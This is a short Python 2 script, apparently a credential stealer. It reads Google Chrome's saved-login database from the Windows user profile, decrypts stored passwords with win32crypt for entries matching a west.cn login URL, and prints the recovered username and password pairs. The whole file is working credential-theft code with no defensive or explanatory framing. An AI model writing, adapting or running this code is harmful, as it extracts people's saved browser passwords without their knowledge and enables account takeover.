from os import getenv
import sqlite3
import win32crypt


def get_chrome_creds():
	path = getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data"
	server = 'http://www.west.cn/login.asp'
	creds = []
	try:
		conn = sqlite3.connect(path)
		cursor = conn.cursor()
		cursor.execute('SELECT action_url, username_value, password_value FROM logins')

		data = cursor.fetchall()	
		if len(data) > 0:
			for result in data:
				if result[0] == server:
					password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
					if password:
						dic = {result[1]:password}
						creds.append(dic)
		return creds
	except Exception, e:
		return 0
		
res = get_chrome_creds()		
print res
